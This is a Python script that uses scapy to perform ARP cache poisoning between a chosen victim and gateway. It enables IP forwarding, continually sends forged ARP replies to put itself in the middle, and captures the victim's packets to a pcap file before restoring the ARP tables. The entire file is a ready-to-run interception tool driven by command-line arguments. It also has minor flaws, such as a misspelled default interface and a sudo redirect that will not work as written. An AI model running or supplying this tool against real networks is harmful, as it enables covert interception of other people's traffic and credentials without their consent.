from multiprocessing import Process

import scapy.all as sc
import os
import sys
import time


def get_mac(target_ip):
    """Return the MAC address for a given IP address."""
    # create an ARP request
    packet = sc.Ether(dst="ff:ff:ff:ff:ff:ff") / sc.ARP(op="who-has", pdst=target_ip)
    # "srp" send and receive packets in layer 2
    # the function returns 2 lists:
    # (1) A list of tuples of packet sent and packet answered
    # (2) A list of unanswered packets
    response = sc.srp(packet, timeout=2, retry=10, verbose=False)[0]
    for pkt_sent, pkt_received in response:
        return pkt_received[sc.Ether].src
    return None


class ARP_Poisoner:
    def __init__(self, victim, gateway, interface="eht0"):
        """Initialize an ARP poisoner."""
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        sc.conf.iface = interface
        sc.conf.verb = 0

        print(f"[+] Initialized {interface}:")
        print(f"[+] Gateway {gateway} is at {self.gateway_mac}.")
        print(f"[+] Victim {victim} is at {self.victim_mac}.")
        print("-" * 30)

    def run(self):
        """Run the attack."""
        self.poison_process = Process(target=self.poison)
        self.poison_process.start()

        self.sniff_process = Process(target=self.sniff)
        self.sniff_process.start()

    @staticmethod
    def _create_arp_resp(psrc, pdst, hwdst) -> sc.ARP:
        arp = sc.ARP()
        arp.op = 2
        arp.psrc = psrc
        arp.pdst = pdst
        arp.hwdst = hwdst
        return arp

    @staticmethod
    def _arp_resp(arp: sc.ARP):
        print(f"[x] IP source: {arp.psrc}")
        print(f"[x] IP destination: {arp.pdst}")
        print(f"[x] MAC source: {arp.hwsrc}")
        print(f"[x] MAC destination: {arp.hwdst}")
        print(arp.summary())
        print("-" * 30)

    def poison(self):
        """Perform ARP cache poisoning."""
        # poison the victim
        poisoned_victim = self._create_arp_resp(
            psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac
        )
        self._arp_resp(poisoned_victim)

        # poison the gateway
        poisoned_gateway = self._create_arp_resp(
            psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac
        )
        self._arp_resp(poisoned_gateway)

        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                sc.send(poisoned_victim)
                sc.send(poisoned_gateway)
            except KeyboardInterrupt:
                self.restore()
                os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
                sys.exit(0)
            # this else block is executed only when
            # the try block succeeds
            else:
                time.sleep(2)

    def sniff(self, count=100):
        # wait for the poison process starting poisoning successully
        time.sleep(5)

        # start sniffing
        print(f"Sniffing {count} packets...")
        bpf_filter = f"ip host {self.victim}"
        packets = sc.sniff(count=count, filter=bpf_filter, iface=self.interface)

        # write packets to pcap
        print("Got the packets!")
        sc.wrpcap("arp_cache_poisoner.pcap", packets)

        # terminating
        self.restore()
        self.poison_process.terminate()
        os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Finished.")

    def restore(self):
        print("Restoring ARP tables...")

        # restore victim's ARP table
        sc.send(
            sc.ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gateway_mac,
                pdst=self.victim,
                hwdst=self.victim_mac,
                count=5,
                verbose=False,
            )
        )

        # restore gateway's ARP table
        sc.send(
            sc.ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victim_mac,
                pdst=self.gateway,
                hwdst=self.gateway_mac,
                count=5,
                verbose=False,
            )
        )


if __name__ == "__main__":
    # enable ip forwarding
    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    poisoner = ARP_Poisoner(victim, gateway, interface)
    poisoner.run()
